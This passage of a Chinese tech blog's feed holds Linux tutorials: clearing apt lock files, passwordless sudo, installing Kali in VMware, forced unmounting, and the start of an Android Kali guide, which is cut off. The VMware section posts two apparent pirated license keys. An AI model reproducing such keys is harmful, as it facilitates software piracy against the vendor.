        <content type="html"><![CDATA[<p>Linux系统中有时执行 apt install 时，可能会显示以下问题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">E: 无法获得锁 /var/lib/dpkg/lock - <span class="token function">open</span> <span class="token punctuation">(</span><span class="token number">11</span>: 资源暂时不可用<span class="token punctuation">)</span>E: 无法锁定管理目录<span class="token punctuation">(</span>/var/lib/dpkg/<span class="token punctuation">)</span>，是否有其他进程正占用它？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据提示分别找到对应的两个lock文件，移除即可；</p><p>解决方法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> /var/cache/apt/archives/lock<span class="token function">sudo</span> <span class="token function">rm</span> /var/lib/dpkg/lock<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再次运行就成功了。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> apt-install-lock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 中 sudo 免密码</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/linux-zhong-sudo-mian-mi-ma/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/linux-zhong-sudo-mian-mi-ma/</url>
      
        <content type="html"><![CDATA[<p>平时在 Linux 中执行一些命令时，可能会遇到 <code>Permission denied</code> 这样的提示，即该用户没有权限；</p><p>所以一般会想到在命令最前面加上 <code>sudo</code> 后再执行，然后有可能会提示输入当前用户的密码；</p><p>再接下来，如果命令没有正常执行，一般又会提示：<code>user is not in the sudoers file. This incident will be reported.</code>，即当前用户没有出现在这个叫 <code>sudoers</code> 的文件里面，那么这个文件在哪里呢？</p><p>一般在这个位置：</p><pre><code>/etc/sudoers</code></pre><p>所以只需要把当前用户添加到这个文件就行了，执行 <code>su</code> 后根据提示输入 <code>root</code> 账户密码，切换到 root 用户，然后用 <code>vi /etc/sudoers</code> 或者 <code>visudo</code> 命令编辑该文件；</p><p>在里面可以找到这一行：</p><pre><code>root ALL=(ALL:ALL) ALL</code></pre><p>大致意思是 root 用户具有所有权限，所以可以在下面加入这么一行：</p><pre><code>user ALL=(ALL:ALL) NOPASSWD:ALL</code></pre><p>其中 <code>user</code> 是当前登录的用户名，这样以后使用该账户执行 <code>sudo</code> 就不用输入密码了；</p><p>如果存在多个账户，要让这些账户执行 <code>sudo</code> 时都不用输入密码的话，可以添加下面这行：</p><pre><code>%sudo ALL=(ALL:ALL) NOPASSWD:ALL</code></pre><p>保存退出就 OK 了。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sudoers sudo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 初识之 Kali Linux 系统安装详细教程（虚拟机）</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/linux-chu-shi-zhi-kali-linux-xi-tong-an-zhuang-xiang-xi-jiao-cheng-xu-ni-ji/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/linux-chu-shi-zhi-kali-linux-xi-tong-an-zhuang-xiang-xi-jiao-cheng-xu-ni-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录 "></a>目录 <span id="home"></h1><ul><li><a href="#1">一、Kali Linux 介绍</a><ul><li><a href="#1.1">1、Linux</a></li><li><a href="#1.2">2、Kali</a></li></ul></li><li><a href="#2">二、虚拟机安装与配置</a><ul><li><a href="#2.1">1、下载</a></li><li><a href="#2.2">2、安装配置</a></li></ul></li><li><a href="#3">三、Kali系统安装与配置</a></li></ul><hr><h1 id="一、Kali-Linux-介绍"><a href="#一、Kali-Linux-介绍" class="headerlink" title="一、Kali Linux 介绍 "></a>一、Kali Linux 介绍 <span id="1"></h1><h2 id="1、Linux"><a href="#1、Linux" class="headerlink" title="1、Linux "></a>1、Linux <span id="1.1"></h2><p><img src="https://i.loli.net/2018/04/15/5ad333eb8df19.jpg" alt="timg2.jpg"></p><p>引用一下<a href="https://baike.baidu.com/item/linux/27050?fr=aladdin">百度百科</a>：</p><p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p><p>Linux有多个发行版本，以下是<a href="https://www.linux.org/">官网</a>提供下载的一些版本：</p><hr><p><img src="https://i.loli.net/2018/04/15/5ad33ed9a2cb8.jpg" alt="20180415140406753.jpg"></p><hr><h2 id="2、Kali"><a href="#2、Kali" class="headerlink" title="2、Kali "></a>2、Kali <span id="1.2"></h2><p><img src="https://i.loli.net/2018/04/15/5ad3332fef322.jpg" alt="timg.jpg"></p><p>kali是linux其中一个发行版，基于Debian，前身是BackTrack（简称BT系统）。kali系统内置大量渗透测试软件，黑客工具箱已不足以形容它，可以说是巨大的渗透系统，涵盖了多个领域，如无线网络、数字取证、服务器、密码、系统漏洞等等，知名软件有：wireshark、aircrack-ng、nmap、hashcat、metasploit-framework(msf)。</p><h1 id="二、虚拟机软安装与配置"><a href="#二、虚拟机软安装与配置" class="headerlink" title="二、虚拟机软安装与配置 "></a>二、虚拟机软安装与配置 <span id="2"></h1><h2 id="1、下载"><a href="#1、下载" class="headerlink" title="1、下载 "></a>1、下载 <span id="2.1"></h2><p>这里将详细介绍在Windows虚拟机中安装kali linux，使用的虚拟机软件是 <strong>VMware</strong>，可以去<a href="https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html">官网下载</a>最新版本，<strong>注意：</strong> VMware 10.0版本之后只支持<strong>64位</strong>系统，如果是32位系统用户需要下载10.0及之前的版本。<br>然后下载发型版的kali linux，<a href="https://www.kali.org/downloads/">官网下载</a>，根据自己情况选择下载32位或64位，完整版或者轻便版，这里我下载的64位完整版。</p><h2 id="1、安装配置"><a href="#1、安装配置" class="headerlink" title="1、安装配置 "></a>1、安装配置 <span id="2.2"></h2><p>接下来一步步安装：</p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b4f7a.jpg" alt="20180415144118372.jpg"></p><p>选择安装位置，注意保证空间充足：</p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b13c4.jpg" alt="20180415144303213.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9afe91.jpg" alt="20180415144404353.jpg"></p><p>等待安装完成：</p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b279d.jpg" alt="20180415144453641.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b7ebf.jpg" alt="20180415144527264.jpg"></p><p>这是试用版本，需要购买密钥，鼓励购买正版，蛮穷的可以使用以下任一密钥：</p><blockquote><p>FF31K-AHZD1-H8ETZ-8WWEZ-WUUVA</p><blockquote><p>CV7T2-6WY5Q-48EWP-ZXY7X-QGUWD</p></blockquote></blockquote><p><img src="https://i.loli.net/2018/04/15/5ad33ed9ae9ca.jpg" alt="20180415144552593.jpg"></p><p>安装完成，然后新建虚拟机：</p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b66b3.jpg" alt="20180415144927247.jpg"></p><p>选择推荐的即可：</p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b3abd.jpg" alt="20180415145002833.jpg"></p><p>这里选择安装程序映像文件，浏览选择刚才下载的kali linux文件，后缀是 <code>.iso</code>：</p><p><img src="https://i.loli.net/2018/04/15/5ad33ed9b9401.jpg" alt="20180415145126392.jpg"></p><p>选择操作系统“linux”，版本是“Debian”：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f949f756.jpg" alt="20180415145812273.jpg"></p><p>名称随便取，然后选择虚拟机文件存放位置：</p><blockquote><p><strong>注意选择合适位置，这里需要存放几十G的虚拟磁盘文件</strong></p></blockquote><p><img src="https://i.loli.net/2018/04/15/5ad33f94a5c83.jpg" alt="20180415145936586.jpg"></p><p>设置虚拟磁盘的大小，一般不能低于默认值，下面一般选择单个文件，方便：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f94b523f.jpg" alt="20180415150112131.jpg"></p><p>新建完成，硬件可以之后自定义：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f94b3b28.jpg" alt="20180415150311408.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad33f94e3f6e.jpg" alt="20180415150339668.jpg"></p><p>觉得默认配置不合适可以自定义调整，例如修改内存大小，增加磁盘：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f9503b03.jpg" alt="20180415150430194.jpg"></p><p>设置网络适配器模式，可以桥接物理网络（例如电脑连接wifi，虚拟机就和电脑连接同一个wifi），或者NAT模式（类似于电脑成为一个路由器，虚拟机连接电脑的热点），如果不想联网，只用于物理机和虚拟机之间的交流，可以选择主机模式：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f94f1e46.jpg" alt="20180415150747931.jpg"></p><p>虚拟机配置完成，接下来开始安装 kali 系统。</p><h1 id="三、Kali系统安装与配置"><a href="#三、Kali系统安装与配置" class="headerlink" title="三、Kali系统安装与配置 "></a>三、Kali系统安装与配置 <span id="3"></h1><p>点击启动虚拟机：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f94edca2.jpg" alt="20180415152337260.jpg"></p><p>鼠标点击安装界面，之后用键盘方向键和Enter键操作：</p><blockquote><p><code>Live</code> 开头的不是系统安装，类似于Windows PE，用于恢复系统，其他选项可以不用管，也暂时用不着。<br><strong>这里我们选择简单的图形化安装</strong> <code>Graphical install</code><br>此时鼠标无法操作，退出虚拟机操作界面使用 <code>ctrl + alt</code> 键。</p></blockquote><p><img src="https://i.loli.net/2018/04/15/5ad33f94d2cb9.jpg" alt="2018041515321839.jpg"></p><p>选择简体中文：</p><p><img src="https://i.loli.net/2018/04/15/5ad33f94eae89.jpg" alt="20180415153852638.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad3403ff0501.jpg" alt="20180415153941517.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad340400b3b8.jpg" alt="20180415154023144.jpg"></p><p>等待配置一会：</p><p><img src="https://i.loli.net/2018/04/15/5ad3404025f68.jpg" alt="20180415154326948.jpg"></p><p>设置主机名称，和Windows的主机名一样：</p><p><img src="https://i.loli.net/2018/04/15/5ad3404034393.jpg" alt="20180415154445426.jpg"></p><p>可以暂时不用输入：</p><p><img src="https://i.loli.net/2018/04/15/5ad34040359fa.jpg" alt="2018041515470772.jpg"></p><p>设置用户密码登录：</p><p><img src="https://i.loli.net/2018/04/15/5ad340404446a.jpg" alt="20180415154826476.jpg"></p><p>等待配置：</p><p><img src="https://i.loli.net/2018/04/15/5ad34040310fe.jpg" alt="20180415154926766.jpg"></p><p>可以选择使用整个磁盘：</p><p><img src="https://i.loli.net/2018/04/15/5ad3404040f96.jpg" alt="20180415155254743.jpg"></p><hr><p><strong>注：</strong></p><p>这里简单介绍一下里面的 <code>LVM</code> 选项：<br>详见<a href="https://baike.baidu.com/item/LVM/6571177?fr=aladdin">百度百科</a>，LVM是 Logical Volume Manager（逻辑卷管理）的简写，它是Linux环境下对磁盘分区进行管理的一种机制。安装Linux时常出现的一个问题就是合理分区，根据使用情况设置 <code>/boot</code>, <code>/var</code>,  <code>/home</code> 等区块的大小，设置好之后再想要改变就很麻烦，要用分区工具压缩一部分的空闲区出去，然后合并到空间不足的区域。</p><p>个人对LVM的理解是，它类似于使用一种<strong>文件夹</strong>的机制，直接使用整块磁盘，把每个分区设置成一种类似文件夹的存在，因为文件夹不会限制大小，因此就能动态调整各区的大小，方便管理。</p><hr><p>继续：</p><p><img src="https://i.loli.net/2018/04/15/5ad340403f668.jpg" alt="20180415160939891.jpg"></p><p>可以使用推荐的：</p><p><img src="https://i.loli.net/2018/04/15/5ad34040429bb.jpg" alt="201804151610212.jpg"></p><p>确定分配，或者更改区块大小和新增区块：</p><p><img src="https://i.loli.net/2018/04/15/5ad3432baa37c.jpg" alt="20180415161246873.jpg"></p><p>确认写入：</p><p><img src="https://i.loli.net/2018/04/15/5ad3432b9fe9b.jpg" alt="20180415161357309.jpg"></p><p>接下来安装时间有点长，喝杯茶休息一下 -_- </p><p><img src="https://i.loli.net/2018/04/15/5ad3432b8d7ed.jpg" alt="20180415161452740.jpg"></p><p>终于安装完成，半小时安静的过去了……<br>这里选择不使用网络镜像：</p><p><img src="https://i.loli.net/2018/04/15/5ad3432b91756.jpg" alt="20180415164804954.jpg"></p><p>配置GRUB：</p><p><img src="https://i.loli.net/2018/04/15/5ad3432ba8703.jpg" alt="20180415165316774.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad3432ba4ff0.jpg" alt="20180415165336903.jpg"></p><p>安装完成：</p><p><img src="https://i.loli.net/2018/04/15/5ad343e7d33a7.jpg" alt="20180415165446531.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad343e7cbddf.jpg" alt="20180415165502624.jpg"></p><p>选择启动，第二个选项是恢复模式：</p><p><img src="https://i.loli.net/2018/04/15/5ad343e7d9d87.jpg" alt="20180415175203402.jpg"></p><p>初始用户名是 <strong>root</strong>：</p><p><img src="https://i.loli.net/2018/04/15/5ad343e7d0471.jpg" alt="2018041517561331.jpg"></p><p>之前设置的密码：</p><p><img src="https://i.loli.net/2018/04/15/5ad343e7d1c6b.jpg" alt="20180415185003860.jpg"></p><p>到此kali系统就安装完毕了：</p><p><img src="https://i.loli.net/2018/04/15/5ad343e7e0f5c.jpg" alt="20180415185053453.jpg"></p><p>内置大量软件，更多功能可以自行发掘：</p><p><img src="https://i.loli.net/2018/04/15/5ad343e7f2511.jpg" alt="20180415185744699.jpg"></p><p><img src="https://i.loli.net/2018/04/15/5ad343e7ef4bf.jpg" alt="20180415185813698.jpg"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali系统安装 linux 虚拟机安装 VMware </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 强行取消挂载</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/linux-qiang-xing-qu-xiao-gua-zai/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/linux-qiang-xing-qu-xiao-gua-zai/</url>
      
        <content type="html"><![CDATA[<p>Linux系统有时需要取消挂载一些设备或者目录，</p><p>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># /dev/sdb挂载到了 /mnt/usb</span><span class="token function">umount</span> /mnt/usb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是多半会提示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">umount: /mnt/usb: target is busy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果已 <strong>备份</strong> 了数据需要强行卸载，并且尝试 <code>umount -f /mnt/usb</code> 还是失败的情况</p><p>可以使用命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fuser</span> <span class="token parameter variable">-cu</span> /mnt/usb  <span class="token comment">#查看挂载文件进程</span><span class="token function">fuser</span> <span class="token parameter variable">-mv</span> /dev/sdb  <span class="token comment">#或者查看挂载点进程</span><span class="token function">fuser</span> <span class="token parameter variable">-ck</span> /mnt/usb  <span class="token comment">#结束进程</span><span class="token function">fuser</span> <span class="token parameter variable">-mk</span> /dev/sdb  <span class="token comment">#使用挂载点结束进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用 <strong>懒卸载</strong> 方式，命令执行后系统会自动关闭相关进程后再卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">umount</span> <span class="token parameter variable">-l</span> /mnt/usb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux挂载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手机端（安卓）安装 Kali Linux 系统详细教程</title>
      <link href="/2024/09/27/cao-zuo-xi-tong/shou-ji-duan-an-zhuang-kali-linux-xi-tong-xiang-xi-jiao-cheng/"/>
      <url>/2024/09/27/cao-zuo-xi-tong/shou-ji-duan-an-zhuang-kali-linux-xi-tong-xiang-xi-jiao-cheng/</url>
      
        <content type="html"><![CDATA[<!--# 前言 之前写有[文章](https://knightyun.github.io/2018/04/15/kali-linux-install)介绍过关于 Kali Linux 系统安装的详细教程，不过是在电脑端真机或虚拟机中的安装步骤，那么作为平时使用最多并且能方便携带的智能手机端，是否有方法或技术来实现安装呢？还确实有，这也是该文章的主旨。我们都知道安卓系统本身就是 Linux 系统的一个发行版本，所以在技术理论上是有可行性的，并且目前还确实有人实现了，至于苹果手机（iOS系统）端，笔者没做研究，就不做阐述了，有兴趣可以自行了解。那么现在就来介绍一下如何在手机端（安卓系统）进行 Linux 系统（包括但不限于 Kali）的安装。 # 原理概述 其实实现该技术的原理并不复杂，由于安卓是 Linux 系统的一个分支，所以和其他主流 Linux 操作系统之间有着很大的共同性，比如很多 shell 指令代码都能使用。另外，Linux 命令中有一个叫 `chroot` 的，大概的作用就是在指定的根目录下运行命令，通俗讲，类似于 Windows 系统中的安全沙箱的概念，即一个安全的隔离环境，这也是该命令的目的所在。因此，既然能在该指定目录下运行一些命令，那么要是把整个操作系统的命令、目录以及文件都装进去，那它不就成了一个嵌入的系统了吗，这里又有些类似虚拟机的概念。 当然，要在手机中执行这些命令就免不了要手机获得 **root 权限**，即对手机进行 ROOT；不用担心，这只是其中一个办法，本文也会介绍另一种不需要 ROOT 手机的方法。总结一下二者的原理：ROOT 操作相当于直接在手机安卓系统中挂载一个 Linux 系统（例如 Kali），而非 ROOT 方法就有些绕，类似于在安卓系统中通过软件挂载一个能执行一些命令的环境（当然这样会有很多权限限制，毕竟没有 ROOT），然后在这个环境中就可以再挂载想要的 Linux 操作系统了，由于这个系统在一个虚拟的环境中，所以就不存在权限的问题了（得不到真实的权限，给与虚拟的权限还是做得到的→_→，哈哈哈）。通俗讲就是，ROOT 使用的是真机中的虚拟机，而非 ROOT 使用的是真机中的虚拟机中的虚拟机（感觉绕可以再读几遍）。 下面是安装系统的两种方法： # ROOT 环境## 主要软件### Linux Deploy有 root 权限的话，安装就比较简单，并且安装的系统使用也比较流畅，毕竟是直接与真机硬件交互的，然后就先介绍一下该方法的主角：**Linux Deploy**，它是一个安卓软件，图标是一个小企鹅，在各大应用市场应该都能搜得到，找不到的话可以在这里下载：<pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;16OKQc2ru5E7yOTliDzNuUw提取码: vi7w<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="VNC-Viewer"><a href="#VNC-Viewer" class="headerlink" title="VNC Viewer"></a>VNC Viewer</h3><p>另外需要一款远程连接软件（这里使用 VNC Viewer）来显示系统界面，因为系统安装到手机中后，一般不会直接把桌面和窗口输出到手机的主屏幕，所以需要远程桌面软件连接到该系统来进行显示，否者就是使用终端连接（如 SSH）的纯命令行操作，VNC Viewer 软件也能在各大市场搜到，或者从下面的链接下载：</p><pre class="line-numbers language-none"><code class="language-none">链接:https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1cjBii8MWSAqsM-9urW658Q提取码:h7si<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h3><p>一款安卓的终端软件（非必需），可以在手机上执行一些 Linux 命令，也可以使用它提供的 SSH 连接到之后安装的系统，依然，市场搜不到可以在下面的链接下载：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1ZOUjbmW0MLjbMunAGecGfA提取码: 5jhj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下面是 Deploy 软件主界面的截图：</p><p><img src="https://i.loli.net/2019/12/11/7imZxLfOoWlKQ9U.jpg" alt="Screen-20191211-132447.png"></p><p><img src="https://i.loli.net/2019/12/11/vheSDoyjMqwIfz5.jpg" alt="Screen-20191211-132433.png"></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在安装系统前，需要进行一些配置，顺便解释一下各个配置选项，先点击软件主页的配置按钮（上图右下角）进入配置页面：</p><p><img src="https://i.loli.net/2019/12/15/wHhuIdSUeTmJErL.jpg" alt="Screen-20191211-142939.png"></p><p><strong>发行版本</strong>，点进去选择想要的 Linux 发行版，这里以 Kali 为例：</p><p><img src="https://i.loli.net/2019/12/15/R7g9OHcXkKydQFM.jpg" alt="Screen-20191211-142948.png"></p><p><strong>架构</strong>，点进去会出来这么几个选项：</p><p><img src="https://i.loli.net/2019/12/15/niRIMCPGuhf9LyE.jpg" alt="Screen-20191211-143014.png"></p><p>这里简单解释一下选项中的五种架构，前三个 <strong>armel, armhf, arm64</strong> 都是 ARM 处理器（常见的手机处理器品牌，类似于电脑的 Intel）的几个版本，区别如下：</p><ul><li><p>armel：（arm eabi little endian）也即softfp，用fpu计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算；</p></li><li><p>armhf：（arm hard float）也即hard，用fpu计算，传参数用fpu中的浮点寄存器传，省去了转换性能最好，但是中断负荷高；</p></li><li><p>arm64：64位的arm默认就是hard float的，因此不需要hf的后缀；</p><p>至于第四个 <strong>i386</strong> 是 Intel 的 32 位处理器架构，最后一个 <strong>amd64</strong> 则是 AMD（一家类似 Intel 的处理器公司）的 64 位处理器架构；</p></li></ul><p>那么要如何判断自己的手机是哪种架构呢？方法很多，可以使用上面提到的 Terminal 软件，通过 <code>cat /proc/cpuinfo</code> 命令查看手机的 CPU 架构信息，如图所示：</p><p><img src="https://i.loli.net/2019/12/15/rZ4mtgvXukenMwT.jpg" alt="Screen-20191211-142738.png"></p><p><img src="https://i.loli.net/2019/12/15/EpgqDJGSTkZBd5y.jpg" alt="Screen-20191211-142830.png"></p><p>这一步查询可能会看到诸如 <strong>ARMv8, ARMv7, Cortex-A, AArch64, AArch32</strong> 等字眼，简单解释一下，ARMv7 和 ARMv8 是两个 ARM 的版本，v7 版本是 <strong>32位</strong> 的，v8 是 ARM 公司的第一款 <strong>64位</strong> 处理器架构，并且从 v7 版本后开始变成了 Cortex 架构，包括 Cortex-A、Cortex-R、C ortex-M 系列，其中的 Cortex-A 系列就是常见的只能手机处理器，另外两个多应用于车载系统，嵌入式微控制器等领域；ARMv8-A 有两种执行状态： <strong>AArch64</strong> 和 <strong>AArch32</strong>（后者是为了兼容以前的32bit的程序），AArch64执行A64指令，使用 64bit 的通用寄存器；AArch32 执行 A32/T32 指令，使用 32bit 的通用寄存器；</p><p>所以可以简单的理解为 ARMv7 是 32位，ARMv8 是 64位的；如果不想用终端和命令查看，也可以使用软件直接查看，比如著名的 <strong>AIDA64</strong>，可以在市场搜索下载，或者使用链接：</p><pre class="line-numbers language-none"><code class="language-none">链接: https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1wvUc0VhWyhb-QGbkd9LylQ提取码: mqby<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开后点击中央处理器模块，内核架构信息里就是要找的架构类型，这里的是 ARMv8 的，如下图：</p><p><img src="https://i.loli.net/2019/12/15/I5DPn1RvTsKFk8j.jpg" alt="Screenshot_20191212_101530_com_finalwire_aida64.jpg"></p><p><img src="https://i.loli.net/2019/12/15/uLlC49VpKSAbQsz.jpg" alt="Screenshot_20191212_101534_com.finalwire.aida64.jpg"></p><p>因此我们在配置里选择 <strong>ARM64</strong>；</p><p><strong>发行版的版本</strong>，之前选择 Kali 的话就默认只有一个 <strong>kali-rolling</strong> 版本，其它系统的话自行决定：</p><p><img src="https://i.loli.net/2019/12/15/aX48MePZDvWrAcK.jpg" alt="Screen-20191211-143025.png"></p><p><strong>源地址</strong>，就是软件从哪里去获取系统镜像等相关文件，这里用默认的就行：</p><p><img src="https://i.loli.net/2019/12/15/NyfMQlYdnj8DkWK.jpg" alt="Screen-20191211-143151.png"></p><p>当然官方源的是网站是国外的，速度可能有点慢，可以选择使用国内的源，比如阿里云和中科大等，详细介绍可以参考这篇 <a href="https://knightyun.github.io/2018/04/21/linux-sources-list">文章</a>，比如使用阿里云的就把地址改为以下内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>安装类型</strong>，一般就选择默认的<strong>镜像文件</strong>类型，方便安全，至于其它类型就是它们字面上的意思，所以可能会和系统出现冲突：</p><p><img src="https://i.loli.net/2019/12/15/WABObciFoQkE9pN.jpg" alt="Screen-20191211-143213.png"></p><p><strong>安装路径</strong>，就是决定把镜像文件安装到哪，并且以什么名字命名，默认的值使用了环境变量，测试似乎存在问题，所以改一下，比如我们安装到内置存储的根目录，以 <strong>kali.img</strong> 命名，就是 <code>/sdcard/kali.img</code>，注意镜像文件的后缀 <code>.img</code> 是固定不变的：</p><p><img src="https://i.loli.net/2019/12/15/Pf85MyzNtirVTd2.jpg" alt="Screen-20191211-143322.png"></p><p><strong>镜像大小</strong>，默认是 0，即自动分配大小，不过经测试，它似乎没有想象中那么<strong>自动</strong> -_-，所以我们就自己设一个值，注意单位是 MB，并且这个值就是安装的系统能用的总存储空间，因此可以稍微设置大一点，具体值随便填，这里的 8096 就是 8GB 左右（1024MB = 1GB）：</p><p><img src="https://i.loli.net/2019/12/15/we1Y9lLFamPNh2j.jpg" alt="Screen-20191211-143431.png"></p><p><strong>文件系统</strong>，现在最新的是 <strong>ext4</strong>，是 Linux 下常用的文件系统，类似于 Windows 里的 <strong>NTFS</strong> 文件系统，或者 U盘使用的 <strong>FAT32</strong> 文件系统，所以这里选择默认的就好：</p><p><img src="https://i.loli.net/2020/01/10/CvLSfMuI7Kac4Vw.png" alt="Screenshot_20200110-220704.png"></p><p><strong>用户名</strong>，即登录系统的账户名（以 test 为例）：</p><p><img src="https://i.loli.net/2019/12/15/agiJk27AYXZ9q5S.jpg" alt="Screen-20191211-143500.png"></p><p><strong>用户密码</strong>，上面的账户对应的密码（也以 test 为例）：</p><p><img src="https://i.loli.net/2019/12/15/Gvkebs2unK3fqWR.jpg" alt="Screen-20191211-143549.png"></p><p><strong>特权用户</strong>，这里填写超级用户 <strong>root</strong>：</p><p><img src="https://i.loli.net/2019/12/15/pYKtgBqiFZoP1le.jpg" alt="Screen-20191211-143512.png"></p><p><strong>本地化</strong>，即系统使用的语言，先使用默认的 <strong>C</strong>（英语），想要中文可以后期改：</p><p><img src="https://i.loli.net/2019/12/15/9Mj4iq7ta1HNYvr.jpg" alt="Screen-20191211-143530.png"></p><p><strong>DNS、Network trigger、Power trigger</strong> 这三项可以不用管，让它们空着；</p><p><strong>初始化</strong>，启用选项可以不用勾上；</p><p><img src="https://i.loli.net/2020/01/10/ArdNxO8UuRzCXSq.png" alt="Screenshot_20200110-220725.png"></p><p><strong>挂载</strong>，即挂载 Android 上的资源，类似于一个文件中转站，设置为手机系统中的一个文件夹，这样这个文件夹中的内容 Linux 系统和手机系统都可以访问，也就实现了互传文件的功能，我们可以勾上：</p><p><img src="https://i.loli.net/2020/01/10/YHO3hZWA4GvzsLI.png" alt="Screenshot_20200110-220746.png"></p><p>点击 <strong>挂载点列表</strong> 后进去，点右上角的加号，添加一个挂载点；第一行填写你设置为文件中转站的目录（该文件夹自己事先创建好）的绝对路径，比如该文件夹创建在 SD 卡根目录，名为 share，那就写 <code>/sdcard/share</code>：</p><p><img src="https://i.loli.net/2019/12/15/GuNeoYL4nh1bMSH.jpg" alt="Screen-20191211-143642.png"></p><p>点确定后完成创建，返回：</p><p><img src="https://i.loli.net/2019/12/15/SB5Pve8zW4DjnLE.jpg" alt="Screen-20191211-143654.png"></p><p><strong>SSH</strong>，即是否开启 Linux 系统的 ssh 服务，勾上后就可以在手机终端用 ssh 命令连接 Linux 系统，这里我们勾上，然后下面的 <strong>SSH 设置</strong> 使用默认的不用改：</p><p><img src="https://i.loli.net/2019/12/15/xUeCwfRXQKkq56B.jpg" alt="Screen-20191211-143722.png"></p><p><strong>声音服务</strong>，即 Linux 系统的声音在手机上播放，这里我们也勾上，设置用默认的不改：</p><p><img src="https://i.loli.net/2019/12/15/WBUXNKobYkJzLah.jpg" alt="Screen-20191211-143742.png"></p><p><strong>图形界面</strong>，这就是一个比较重要的设置了，因为一旦 Linux 系统在手机上安装好后，不安装图形桌面（类似于 Windows 的桌面）的话，就只能通过 ssh 进行命令行操作系统；勾选启用后，点击下面的 <strong>图形子系统</strong> 选项，会弹出以下选项：</p><p>一般选 VNC，另外两个选项后面介绍：</p><p><img src="https://i.loli.net/2019/12/25/Bp8Ehm1Uj5HIrAb.jpg" alt="Screen-20191211-143922.png"></p><p><strong>图形界面设置</strong>，对应上面的 VNC 结果，一般也是使用默认的不用改，了解选项含义的可以自行修改：</p><p><img src="https://i.loli.net/2019/12/25/Zr2IXWQR48jaeTE.jpg" alt="Screen-20191211-143932.png"></p><p><strong>桌面环境</strong>，即图形桌面环境的外观，这里我们选 <strong>Xfce</strong>：<br><img src="https://i.loli.net/2019/12/25/EFUOQX8ropuVgL1.jpg" alt="Screen-20191211-144032.png"></p><p>下面也贴出几个选项对应的桌面外观截图，以供参考：</p><p><strong>Xterm</strong>（无图形桌面，只有 shell）:</p><p><img 